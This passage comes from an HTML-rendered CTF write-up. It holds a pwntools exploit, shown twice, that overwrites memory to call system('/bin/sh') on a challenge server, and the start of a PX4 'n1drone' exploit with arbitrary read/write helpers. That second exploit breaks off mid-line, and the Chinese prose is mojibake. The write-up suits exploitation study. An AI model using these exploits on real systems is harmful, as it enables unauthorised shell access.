style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">BIN</span><span style="color:#999999"> =</span><span style="color:#B5695977"> '</span><span style="color:#B56959">./core/user</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">libc</span><span style="color:#999999">=</span><span style="color:#393A34">ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">60.205.163.215</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 60007</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">> </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> kwrite</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34">size</span><span style="color:#999999">,</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">: </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">: </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">size</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">: </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> kappend</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34">size</span><span style="color:#999999">,</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">: </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">: </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">size</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">: </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> kwdescription</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">#io.sendline(b'aaa')</span><br><span style="color:#393A34">kwrite</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">f0</span><span style="color:#999999">,</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">deadbeef</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">kappend</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">f</span><span style="color:#999999">,</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">405050</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">deadbeef</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">content:</span><span style="color:#A65E2B">\x20\x0d\x0a</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">606f0</span><br><span style="color:#393A34">kappend</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">f</span><span style="color:#999999">,</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">405220</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">deadbeef</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload</span><span style="color:#999999">=</span><span style="color:#393A34">base64</span><span style="color:#999999">.</span><span style="color:#393A34">b64encode</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00\x00</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">kwdescription</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">kappend</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">f</span><span style="color:#999999">,</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">405030</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">deadbeef</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload</span><span style="color:#999999">=</span><span style="color:#393A34">base64</span><span style="color:#999999">.</span><span style="color:#393A34">b64encode</span><span style="color:#2993a3">(</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">system</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">kwdescription</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> os</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> base64</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">terminal </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">tmux</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">splitw</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">-h</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">BIN</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">./core/user</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">60.205.163.215</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 60007</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#CB7676">def</span><span style="color:#80A665"> kwrite</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> kappend</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><br><span style="color:#CB7676">def</span><span style="color:#80A665"> kwdescription</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">#io.sendline(b'aaa')</span><br><span style="color:#DBD7CAEE">kwrite</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">f0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">deadbeef</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">kappend</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">f</span><span style="color:#666666">,</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">405050</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">deadbeef</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">content:</span><span style="color:#C99076">\x20\x0d\x0a</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">606f0</span><br><span style="color:#DBD7CAEE">kappend</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">f</span><span style="color:#666666">,</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">405220</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">deadbeef</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">base64</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">b64encode</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00\x00</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">kwdescription</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">kappend</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">f</span><span style="color:#666666">,</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">405030</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">deadbeef</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">base64</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">b64encode</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">system</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">kwdescription</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="n1drone" class="scroll-target"><a href="#n1drone"><code class="hash inline-code">#</code>n1drone</a></h2>
<p>å…ˆç”¨ dockerfile.run æ–‡ä»¶æŠŠç¯å¢ƒæ­å‡ºæ¥ï¼Œç®€å•æµ‹è¯•ä¸€ä¸‹åŠŸèƒ½ã€‚</p>
<p>çœ‹ä¸€ä¸‹å‡ºé¢˜äººç»™çš„ n1_sub_manager_main.cppï¼Œç›¸å½“äºç»™äº†ä»»æ„åœ°å€è¯»å†™çš„åŸè¯­ã€‚</p>
<p>å¦å¤–å‘ç° <code class="inline-code">list_tasks</code> å¯ä»¥æ³„æ¼ <code class="inline-code">tls</code> åœ°å€ï¼Œåœ¨å®ƒä¸‹é¢å°±æœ‰ libc æŒ‡é’ˆå’Œ stack æŒ‡é’ˆã€‚</p>
<p>éé¢„æœŸï¼šé€šè¿‡ <code class="inline-code">bsondump /proc/self/maps</code> å¯ä»¥æ³„æ¼ pie å‡ºæ¥ã€‚</p>
<p>æœ‰äº†æ ˆåœ°å€ï¼Œå¯ä»¥åƒå †é¢˜æ‰“ <code class="inline-code">environ</code> ä¸€æ ·ï¼Œç›´æ¥å»æ‰“ edit chunk é‚£ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™ä¸ªé¢˜å°±æ˜¯ç›´æ¥æ‰“ <code class="inline-code">n1_sub_manager write</code> çš„è¿”å›åœ°å€å°±å¯ä»¥äº†</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./run/bin/px4</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">info</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">127.0.0.1</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8080</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">cmd</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">pxh></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> cmd</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> arbread</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    cmd </span><span style="color:#999999">=</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"n1_sub_manager write 0x24 </span><span style="color:#2993a3">{</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><span style="color:#B56959">"</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">cmd</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">listener debug_key_value</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">timestamp: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> (</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> arbwrite</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    cmd </span><span style="color:#999999">=</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"n1_sub_manager write 0x23 </span><span style="color:#2993a3">{</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><span style="color:#B56959">"</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">cmd</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    cmd </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">n1_sub_manager publish 0x23</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">cmd</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span 